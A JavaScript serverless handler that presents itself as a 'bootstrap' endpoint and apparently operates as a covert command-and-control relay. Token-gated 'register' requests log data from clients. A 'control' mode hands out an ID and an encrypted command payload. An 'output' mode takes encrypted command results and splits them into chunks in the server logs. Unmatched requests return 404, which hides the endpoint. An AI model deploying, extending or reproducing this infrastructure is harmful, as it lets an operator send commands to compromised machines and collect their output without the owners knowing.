import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '39';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}
function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}
export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
